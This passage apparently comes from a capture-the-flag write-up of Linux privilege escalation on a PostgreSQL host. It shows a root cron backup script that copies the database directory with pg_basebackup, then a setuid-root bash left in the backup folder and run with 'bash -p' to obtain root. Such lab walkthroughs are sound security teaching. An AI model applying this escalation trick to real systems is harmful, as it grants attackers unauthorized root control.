2026/04/03 07:18:39 CMD: UID=0     PID=11056  | /sbin/init\
2026/04/03 07:18:39 CMD: UID=0     PID=11062  | /usr/bin/snap run amazon-ssm-agent\
2026/04/03 07:18:49 CMD: UID=115   PID=11077  | postgres: 14/main: autovacuum worker\
2026/04/03 07:18:50 CMD: UID=0     PID=11078  | /usr/bin/snap run amazon-ssm-agent\
2026/04/03 07:18:50 CMD: UID=0     PID=11085  | /usr/bin/snap run amazon-ssm-agent\
2026/04/03 07:19:00 CMD: UID=0     PID=11099  | (snap)\
2026/04/03 07:19:00 CMD: UID=0     PID=11105  |\
2026/04/03 07:19:01 CMD: UID=0     PID=11119  | /usr/sbin/CRON -f -P\
2026/04/03 07:19:01 CMD: UID=0     PID=11120  |\
2026/04/03 07:19:01 CMD: UID=0     PID=11121  | /bin/bash /usr/bin/backup\
2026/04/03 07:19:01 CMD: UID=0     PID=11122  | /bin/bash /usr/bin/backup\
2026/04/03 07:19:01 CMD: UID=0     PID=11123  | /usr/bin/rm -rf /opt/backups/current/PG\_VERSION /opt/backups/current/backup\_label /opt/backups/current/backup\_manifest /opt/backups/current/base /opt/backups/current/bash /opt/backups/current/global /opt/backups/current/pg\_commit\_ts /opt/backups/current/pg\_dynshmem /opt/backups/current/pg\_logical /opt/backups/current/pg\_multixact /opt/backups/current/pg\_notify /opt/backups/current/pg\_replslot /opt/backups/current/pg\_serial /opt/backups/current/pg\_snapshots /opt/backups/current/pg\_stat /opt/backups/current/pg\_stat\_tmp /opt/backups/current/pg\_subtrans /opt/backups/current/pg\_tblspc /opt/backups/current/pg\_twophase /opt/backups/current/pg\_wal /opt/backups/current/pg\_xact /opt/backups/current/postgresql.auto.conf\
2026/04/03 07:19:01 CMD: UID=0     PID=11124  | /usr/bin/perl /usr/bin/pg\_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/\
2026/04/03 07:19:01 CMD: UID=115   PID=11125  | postgres: 14/main: walsender postgres \[local] idle\
2026/04/03 07:19:01 CMD: UID=115   PID=11126  | postgres: 14/main: walsender postgres \[local] idle\
2026/04/03 07:19:01 CMD: UID=0     PID=11127  | /usr/lib/postgresql/14/bin/pg\_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/\
2026/04/03 07:19:02 CMD: UID=0     PID=11128  |\
2026/04/03 07:19:03 CMD: UID=0     PID=11129  | /bin/bash /usr/bin/backup\
2026/04/03 07:19:03 CMD: UID=0     PID=11131  | /bin/bash /usr/bin/backup\
2026/04/03 07:19:03 CMD: UID=0     PID=11130  | /usr/bin/find /var/backups/ -maxdepth 1 -type f -o -type d\
2026/04/03 07:19:10 CMD: UID=115   PID=11132  | postgres: 14/main: autovacuum worker\
2026/04/03 07:19:11 CMD: UID=0     PID=11133  | (snap)\
2026/04/03 07:19:11 CMD: UID=0     PID=11139  | /usr/bin/snap run amazon-ssm-agent\
{{< /code >}}

`/usr/bin/backup`

```
postgres@slonik:/dev/shm$ ls -al /usr/bin/backup
-rwxr-xr-x 1 root root 392 Oct 24  2023 /usr/bin/backup
postgres@slonik:/dev/shm$ 
```

{{< code >}}\
\#!/bin/bash

date=$(/usr/bin/date +"%FT%H%M")
/usr/bin/rm -rf /opt/backups/current/*
/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
/usr/bin/zip -r "/var/backups/archive-$date.zip" /opt/backups/current/

count=$(/usr/bin/find "/var/backups/" -maxdepth 1 -type f -o -type d | /usr/bin/wc -l)
if [ "$count" -gt 10 ]; then\
/usr/bin/rm -rf /var/backups/\*\
fi\
{{< /code >}}

```
/usr/bin/pg_basebackup
```

https://docs.postgresql.tw/reference/client-applications/pg\_basebackup

```
postgres@slonik:~/14/main$ ls
PG_VERSION  pg_commit_ts  pg_multixact  pg_serial     pg_stat_tmp  pg_twophase  postgresql.auto.conf
base        pg_dynshmem   pg_notify     pg_snapshots  pg_subtrans  pg_wal       postmaster.opts
global      pg_logical    pg_replslot   pg_stat       pg_tblspc    pg_xact      postmaster.pid
postgres@slonik:~/14/main$ 
```

```
postgres@slonik:~/14/main$ diff <(ls -1) <(ls /opt/backups/current/ -1)
1a2,3
> backup_label
> backup_manifest
20,21d21
< postmaster.opts
< postmaster.pid
postgres@slonik:~/14/main$ 

```

```
postgres@slonik:~/14/main$ ls -al /opt/backups/current/bash 
-rwsrwsrwx 1 root root 1396520 Apr  3 07:34 /opt/backups/current/bash
```

```
postgres@slonik:~/14/main$ /opt/backups/current/bash -p
bash-5.1# whoami 
root
```
